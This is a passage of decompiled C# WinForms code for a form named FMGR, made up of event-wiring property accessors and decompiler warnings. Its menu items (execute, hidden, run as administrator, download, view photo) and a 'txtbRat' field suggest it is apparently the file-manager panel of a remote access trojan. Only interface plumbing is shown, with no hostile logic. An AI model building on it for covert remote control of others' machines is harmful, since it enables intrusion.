				((ToolStripItem)_RemoveAllCompletedToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem OpenDownloadFolderToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _OpenDownloadFolderToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = OpenDownloadFolderToolStripMenuItem_Click;
			if (_OpenDownloadFolderToolStripMenuItem != null)
			{
				((ToolStripItem)_OpenDownloadFolderToolStripMenuItem).remove_Click(eventHandler);
			}
			_OpenDownloadFolderToolStripMenuItem = value;
			if (_OpenDownloadFolderToolStripMenuItem != null)
			{
				((ToolStripItem)_OpenDownloadFolderToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual Panel Panel5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel5 = value;
		}
	}

	internal virtual ToolStripMenuItem NormalToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _NormalToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = NormalToolStripMenuItem_Click;
			if (_NormalToolStripMenuItem != null)
			{
				((ToolStripItem)_NormalToolStripMenuItem).remove_Click(eventHandler);
			}
			_NormalToolStripMenuItem = value;
			if (_NormalToolStripMenuItem != null)
			{
				((ToolStripItem)_NormalToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem HiddenToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _HiddenToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = HiddenToolStripMenuItem_Click;
			if (_HiddenToolStripMenuItem != null)
			{
				((ToolStripItem)_HiddenToolStripMenuItem).remove_Click(eventHandler);
			}
			_HiddenToolStripMenuItem = value;
			if (_HiddenToolStripMenuItem != null)
			{
				((ToolStripItem)_HiddenToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem AsAdministratorToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _AsAdministratorToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = AsAdministratorToolStripMenuItem_Click;
			if (_AsAdministratorToolStripMenuItem != null)
			{
				((ToolStripItem)_AsAdministratorToolStripMenuItem).remove_Click(eventHandler);
			}
			_AsAdministratorToolStripMenuItem = value;
			if (_AsAdministratorToolStripMenuItem != null)
			{
				((ToolStripItem)_AsAdministratorToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem DetailsToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _DetailsToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = DetailsToolStripMenuItem_Click;
			if (_DetailsToolStripMenuItem != null)
			{
				((ToolStripItem)_DetailsToolStripMenuItem).remove_Click(eventHandler);
			}
			_DetailsToolStripMenuItem = value;
			if (_DetailsToolStripMenuItem != null)
			{
				((ToolStripItem)_DetailsToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem LargeToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _LargeToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = LargeToolStripMenuItem_Click;
			if (_LargeToolStripMenuItem != null)
			{
				((ToolStripItem)_LargeToolStripMenuItem).remove_Click(eventHandler);
			}
			_LargeToolStripMenuItem = value;
			if (_LargeToolStripMenuItem != null)
			{
				((ToolStripItem)_LargeToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem TitleToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _TitleToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = TitleToolStripMenuItem_Click;
			if (_TitleToolStripMenuItem != null)
			{
				((ToolStripItem)_TitleToolStripMenuItem).remove_Click(eventHandler);
			}
			_TitleToolStripMenuItem = value;
			if (_TitleToolStripMenuItem != null)
			{
				((ToolStripItem)_TitleToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem TToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _TToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = TToolStripMenuItem_Click;
			if (_TToolStripMenuItem != null)
			{
				((ToolStripItem)_TToolStripMenuItem).remove_Click(eventHandler);
			}
			_TToolStripMenuItem = value;
			if (_TToolStripMenuItem != null)
			{
				((ToolStripItem)_TToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ContextMenuStrip ContextMenuStrip3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ContextMenuStrip3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ContextMenuStrip3 = value;
		}
	}

	internal virtual ToolStripMenuItem ExecuteToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _ExecuteToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ExecuteToolStripMenuItem_Click;
			if (_ExecuteToolStripMenuItem != null)
			{
				((ToolStripItem)_ExecuteToolStripMenuItem).remove_Click(eventHandler);
			}
			_ExecuteToolStripMenuItem = value;
			if (_ExecuteToolStripMenuItem != null)
			{
				((ToolStripItem)_ExecuteToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem DownloadToolStripMenuItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _DownloadToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = DownloadToolStripMenuItem1_Click;
			if (_DownloadToolStripMenuItem1 != null)
			{
				((ToolStripItem)_DownloadToolStripMenuItem1).remove_Click(eventHandler);
			}
			_DownloadToolStripMenuItem1 = value;
			if (_DownloadToolStripMenuItem1 != null)
			{
				((ToolStripItem)_DownloadToolStripMenuItem1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ImageList ImageList3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList3 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader6
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader6 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader7
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader7 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader8
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader8 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader9
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader9 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader10
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader10 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader11
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader11 = value;
		}
	}

	internal virtual ImageList ImageList4
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList4 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel8
	{
		[DebuggerNonUserCode]
		get
		{
			return _ToolStripStatusLabel8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ToolStripStatusLabel8 = value;
		}
	}

	internal virtual Panel Panel6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel6 = value;
		}
	}

	internal virtual Button StopSearc
	{
		[DebuggerNonUserCode]
		get
		{
			return _StopSearc;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_StopSearc != null)
			{
				((Control)_StopSearc).remove_Click(eventHandler);
			}
			_StopSearc = value;
			if (_StopSearc != null)
			{
				((Control)_StopSearc).add_Click(eventHandler);
			}
		}
	}

	internal virtual Panel Panel7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel7 = value;
		}
	}

	internal virtual ListView listSearchFiles
	{
		[DebuggerNonUserCode]
		get
		{
			return _listSearchFiles;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			ColumnClickEventHandler val = new ColumnClickEventHandler(SearchFiles_ColumnClick);
			if (_listSearchFiles != null)
			{
				_listSearchFiles.remove_ColumnClick(val);
			}
			_listSearchFiles = value;
			if (_listSearchFiles != null)
			{
				_listSearchFiles.add_ColumnClick(val);
			}
		}
	}

	internal virtual ColumnHeader ColumnHeader12
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader12 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader13
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader13 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual ToolStripMenuItem CopyFilePathToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _CopyFilePathToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CopyFilePathToolStripMenuItem_Click;
			if (_CopyFilePathToolStripMenuItem != null)
			{
				((ToolStripItem)_CopyFilePathToolStripMenuItem).remove_Click(eventHandler);
			}
			_CopyFilePathToolStripMenuItem = value;
			if (_CopyFilePathToolStripMenuItem != null)
			{
				((ToolStripItem)_CopyFilePathToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button pathRefr
	{
		[DebuggerNonUserCode]
		get
		{
			return _pathRefr;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_pathRefr != null)
			{
				((Control)_pathRefr).remove_Click(eventHandler);
			}
			_pathRefr = value;
			if (_pathRefr != null)
			{
				((Control)_pathRefr).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox LocatPath
	{
		[DebuggerNonUserCode]
		get
		{
			return _LocatPath;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			KeyEventHandler val = new KeyEventHandler(Pathloc_KeyDown);
			if (_LocatPath != null)
			{
				((Control)_LocatPath).remove_KeyDown(val);
			}
			_LocatPath = value;
			if (_LocatPath != null)
			{
				((Control)_LocatPath).add_KeyDown(val);
			}
		}
	}

	internal virtual Button pathEntr
	{
		[DebuggerNonUserCode]
		get
		{
			return _pathEntr;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = En_Click;
			if (_pathEntr != null)
			{
				((Control)_pathEntr).remove_Click(eventHandler);
			}
			_pathEntr = value;
			if (_pathEntr != null)
			{
				((Control)_pathEntr).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem DiscoverRarFileToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _DiscoverRarFileToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = DiscoverRarFileToolStripMenuItem_Click;
			if (_DiscoverRarFileToolStripMenuItem != null)
			{
				((ToolStripItem)_DiscoverRarFileToolStripMenuItem).remove_Click(eventHandler);
			}
			_DiscoverRarFileToolStripMenuItem = value;
			if (_DiscoverRarFileToolStripMenuItem != null)
			{
				((ToolStripItem)_DiscoverRarFileToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ViewPhotoToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _ViewPhotoToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ViewPhotoToolStripMenuItem_Click;
			if (_ViewPhotoToolStripMenuItem != null)
			{
				((ToolStripItem)_ViewPhotoToolStripMenuItem).remove_Click(eventHandler);
			}
			_ViewPhotoToolStripMenuItem = value;
			if (_ViewPhotoToolStripMenuItem != null)
			{
				((ToolStripItem)_ViewPhotoToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ReadTextFileToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _ReadTextFileToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ReadTextFileToolStripMenuItem_Click;
			if (_ReadTextFileToolStripMenuItem != null)
			{
				((ToolStripItem)_ReadTextFileToolStripMenuItem).remove_Click(eventHandler);
			}
			_ReadTextFileToolStripMenuItem = value;
			if (_ReadTextFileToolStripMenuItem != null)
			{
				((ToolStripItem)_ReadTextFileToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox txtbRat
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtbRat;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txtbRat = value;
		}
	}

	internal virtual ToolStripMenuItem PropertiesToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _PropertiesToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = PropertiesToolStripMenuItem_Click;
			if (_PropertiesToolStripMenuItem != null)
			{
				((ToolStripItem)_PropertiesToolStripMenuItem).remove_Click(eventHandler);
			}
			_PropertiesToolStripMenuItem = value;
			if (_PropertiesToolStripMenuItem != null)
			{
				((ToolStripItem)_PropertiesToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	[DebuggerNonUserCode]
	public FMGR()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		((Control)this).add_Resize((EventHandler)FileManager_Resize);
		((Form)this).add_FormClosed(new FormClosedEventHandler(FileManager_FormClosed));
		((Form)this).add_Load((EventHandler)FileManager_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(FileManager_FormClosing));
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Expected O, but got Unknown
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cf: Expected O, but got Unknown
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Expected O, but got Unknown
		//IL_013b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0145: Expected O, but got Unknown
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Expected O, but got Unknown
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_015b: Expected O, but got Unknown
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0166: Expected O, but got Unknown
		//IL_0167: Unknown result type (might be due to invalid IL or missing references)
		//IL_0171: Expected O, but got Unknown
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_017c: Expected O, but got Unknown
		//IL_017d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0187: Expected O, but got Unknown
		//IL_0188: Unknown result type (might be due to invalid IL or missing references)
		//IL_0192: Expected O, but got Unknown
		//IL_0193: Unknown result type (might be due to invalid IL or missing references)
		//IL_019d: Expected O, but got Unknown
		//IL_019e: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a8: Expected O, but got Unknown
		//IL_01a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b3: Expected O, but got Unknown
		//IL_01b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01be: Expected O, but got Unknown
		//IL_01bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c9: Expected O, but got Unknown
		//IL_01ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d4: Expected O, but got Unknown
		//IL_01d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01df: Expected O, but got Unknown
		//IL_01e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f0: Expected O, but got Unknown
		//IL_01f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0201: Expected O, but got Unknown
		//IL_0202: Unknown result type (might be due to invalid IL or missing references)
		//IL_020c: Expected O, but got Unknown
		//IL_020d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0217: Expected O, but got Unknown
		//IL_021e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0228: Expected O, but got Unknown
		//IL_0229: Unknown result type (might be due to invalid IL or missing references)
		//IL_0233: Expected O, but got Unknown
		//IL_0234: Unknown result type (might be due to invalid IL or missing references)
		//IL_023e: Expected O, but got Unknown
		//IL_023f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0249: Expected O, but got Unknown
		//IL_024a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0254: Expected O, but got Unknown
		//IL_0255: Unknown result type (might be due to invalid IL or missing references)
		//IL_025f: Expected O, but got Unknown
		//IL_0266: Unknown result type (might be due to invalid IL or missing references)
		//IL_0270: Expected O, but got Unknown
		//IL_0277: Unknown result type (might be due to invalid IL or missing references)
		//IL_0281: Expected O, but got Unknown
		//IL_0288: Unknown result type (might be due to invalid IL or missing references)
		//IL_0292: Expected O, but got Unknown
		//IL_029e: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a8: Expected O, but got Unknown
		//IL_02a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b3: Expected O, but got Unknown
		//IL_02b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02be: Expected O, but got Unknown
		//IL_02bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c9: Expected O, but got Unknown
		//IL_02ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d4: Expected O, but got Unknown
		//IL_02d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02df: Expected O, but got Unknown
		//IL_02e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ea: Expected O, but got Unknown
		//IL_02eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f5: Expected O, but got Unknown
		//IL_02f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0300: Expected O, but got Unknown
		//IL_0301: Unknown result type (might be due to invalid IL or missing references)
		//IL_030b: Expected O, but got Unknown
		//IL_030c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0316: Expected O, but got Unknown
		//IL_0317: Unknown result type (might be due to invalid IL or missing references)
		//IL_0321: Expected O, but got Unknown
		//IL_0322: Unknown result type (might be due to invalid IL or missing references)
		//IL_032c: Expected O, but got Unknown
		//IL_032d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0337: Expected O, but got Unknown
		//IL_0338: Unknown result type (might be due to invalid IL or missing references)
		//IL_0342: Expected O, but got Unknown
		//IL_0343: Unknown result type (might be due to invalid IL or missing references)
		//IL_034d: Expected O, but got Unknown
		//IL_034e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0358: Expected O, but got Unknown
		//IL_0359: Unknown result type (might be due to invalid IL or missing references)
		//IL_0363: Expected O, but got Unknown
		//IL_0364: Unknown result type (might be due to invalid IL or missing references)
		//IL_036e: Expected O, but got Unknown
		//IL_036f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0379: Expected O, but got Unknown
		//IL_037a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0384: Expected O, but got Unknown
		//IL_0385: Unknown result type (might be due to invalid IL or missing references)
		//IL_038f: Expected O, but got Unknown
		//IL_0390: Unknown result type (might be due to invalid IL or missing references)
		//IL_039a: Expected O, but got Unknown
		//IL_039b: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a5: Expected O, but got Unknown
		//IL_03a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b0: Expected O, but got Unknown
		//IL_03b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bb: Expected O, but got Unknown
		//IL_03bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c6: Expected O, but got Unknown
		//IL_03c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d1: Expected O, but got Unknown
		//IL_03d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03dc: Expected O, but got Unknown
		//IL_03dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e7: Expected O, but got Unknown
		//IL_03e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f2: Expected O, but got Unknown
		//IL_03f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fd: Expected O, but got Unknown
		//IL_03fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0408: Expected O, but got Unknown
		//IL_0409: Unknown result type (might be due to invalid IL or missing references)
		//IL_0413: Expected O, but got Unknown
		//IL_0414: Unknown result type (might be due to invalid IL or missing references)
		//IL_041e: Expected O, but got Unknown
		//IL_041f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0429: Expected O, but got Unknown
		//IL_042a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0434: Expected O, but got Unknown
		//IL_0435: Unknown result type (might be due to invalid IL or missing references)
		//IL_043f: Expected O, but got Unknown
		//IL_0440: Unknown result type (might be due to invalid IL or missing references)
		//IL_044a: Expected O, but got Unknown
		//IL_044b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0455: Expected O, but got Unknown
		//IL_0456: Unknown result type (might be due to invalid IL or missing references)
		//IL_0460: Expected O, but got Unknown
		//IL_0461: Unknown result type (might be due to invalid IL or missing references)
		//IL_046b: Expected O, but got Unknown
		//IL_046c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0476: Expected O, but got Unknown
		//IL_0477: Unknown result type (might be due to invalid IL or missing references)
		//IL_0481: Expected O, but got Unknown
		//IL_0482: Unknown result type (might be due to invalid IL or missing references)
		//IL_048c: Expected O, but got Unknown
		//IL_048d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0497: Expected O, but got Unknown
		//IL_0498: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a2: Expected O, but got Unknown
		//IL_04a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ad: Expected O, but got Unknown
		//IL_04ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b8: Expected O, but got Unknown
		//IL_04b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c3: Expected O, but got Unknown
		//IL_04c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ce: Expected O, but got Unknown
		//IL_04cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d9: Expected O, but got Unknown
		//IL_04da: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e4: Expected O, but got Unknown
		//IL_04e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ef: Expected O, but got Unknown
		//IL_04f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04fa: Expected O, but got Unknown
		//IL_04fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0505: Expected O, but got Unknown
		//IL_0d4c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d56: Expected O, but got Unknown
		//IL_0db2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dbc: Expected O, but got Unknown
		//IL_1238: Unknown result type (might be due to invalid IL or missing references)
		//IL_1242: Expected O, but got Unknown
		//IL_12d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_12db: Expected O, but got Unknown
		//IL_14f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_17d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_17df: Expected O, but got Unknown
		//IL_19b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_19c1: Expected O, but got Unknown
		//IL_1e42: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f60: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f6a: Expected O, but got Unknown
		//IL_21be: Unknown result type (might be due to invalid IL or missing references)
		//IL_21c8: Expected O, but got Unknown
		//IL_2235: Unknown result type (might be due to invalid IL or missing references)
		//IL_223f: Expected O, but got Unknown
		//IL_22c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_22d0: Expected O, but got Unknown
		//IL_23c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_23cc: Expected O, but got Unknown
		//IL_257d: Unknown result type (might be due to invalid IL or missing references)
		//IL_274e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2817: Unknown result type (might be due to invalid IL or missing references)
		//IL_2821: Expected O, but got Unknown
		//IL_2abb: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ac5: Expected O, but got Unknown
		//IL_2eaf: Unknown result type (might be due to invalid IL or missing references)
		//IL_2eb9: Expected O, but got Unknown
		components = new Container();
